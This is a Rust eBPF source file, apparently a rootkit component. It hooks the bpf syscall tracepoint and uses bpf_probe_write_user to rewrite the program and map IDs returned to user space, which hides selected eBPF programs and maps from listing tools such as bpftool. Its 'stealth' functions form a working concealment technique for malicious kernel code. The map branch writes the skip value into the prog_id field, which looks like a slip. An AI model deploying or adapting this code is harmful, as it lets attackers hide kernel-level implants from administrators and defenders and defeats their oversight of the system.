#![no_std]
#![no_main]

use aya_ebpf::{
    bindings::{bpf_attr, bpf_cmd},
    helpers::{bpf_probe_read, bpf_probe_write_user},
    macros::{map, tracepoint, uprobe},
    maps::HashMap,
    programs::{ProbeContext, TracePointContext},
};
use aya_log_ebpf::info;

#[map]
static PROG_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(16, 0);
#[map]
static MAP_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(16, 0);
// syscall sys_enter_bpf
// format:
//         field:unsigned short common_type;       offset:0;       size:2; signed:0;
//         field:unsigned char common_flags;       offset:2;       size:1; signed:0;
//         field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
//         field:int common_pid;   offset:4;       size:4; signed:1;

//         field:int __syscall_nr; offset:8;       size:4; signed:1;
//         field:int cmd;  offset:16;      size:8; signed:0;
//         field:union bpf_attr * uattr;   offset:24;      size:8; signed:0;
//         field:unsigned int size;        offset:32;      size:8; signed:0;
#[tracepoint]
fn stealth_tracepoint(ctx: TracePointContext) -> Result<u32, u32> {
    let cmd: u32 = unsafe { ctx.read_at(16).map_err(|_| 0u32)? };
    match cmd {
        bpf_cmd::BPF_PROG_GET_NEXT_ID => {
            let mut_prog_attr: *mut bpf_attr = unsafe { ctx.read_at(24).map_err(|_| 0u32)? };

            let mut prog_attr_cpy: bpf_attr =
                unsafe { bpf_probe_read(mut_prog_attr).map_err(|_| 1u32)? };
            let prog_id = unsafe { prog_attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };
            if let Some(skip_id) = unsafe { PROG_SKIP.get(&prog_id) } {
                prog_attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id = *skip_id;
                unsafe {
                    bpf_probe_write_user(mut_prog_attr, &prog_attr_cpy as *const bpf_attr)
                        .map_err(|_| 0u32)?
                };
                info!(&ctx, "prog: {} -> {}", prog_id, *skip_id);
            }
        }
        bpf_cmd::BPF_MAP_GET_NEXT_ID => {
            let mut_map_attr: *mut bpf_attr = unsafe { ctx.read_at(24).map_err(|_| 0u32)? };
            let mut map_attr_cpy: bpf_attr =
                unsafe { bpf_probe_read(mut_map_attr).map_err(|_| 1u32)? };
            let map_id = unsafe { map_attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };

            if let Some(skip_id) = unsafe { MAP_SKIP.get(&map_id) } {
                map_attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id = *skip_id;
                unsafe {
                    bpf_probe_write_user(mut_map_attr, &map_attr_cpy as *const bpf_attr)
                        .map_err(|_| 0u32)?
                };
                info!(&ctx, "map: {} -> {}", map_id, *skip_id);
            }
        }
        _ => {}
    };

    Ok(0)
}

//static int bpf_obj_get_next_id(u32 start_id, u32 *next_id, int cmd)
#[uprobe]
fn stealth_probe(ctx: ProbeContext) -> Result<u32, u32> {
    info!(&ctx, "in");
    let start_id: *const u32 = ctx.arg(0).ok_or(1u32)?;
    let cmd: *const u32 = ctx.arg(2).ok_or(1u32)?;
    let start_id = unsafe { bpf_probe_read(start_id).map_err(|_| 1u32)? };
    let cmd = unsafe { bpf_probe_read(cmd).map_err(|_| 1u32)? };
    info!(&ctx, "cmd {} prog_id {}", cmd, start_id);
    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
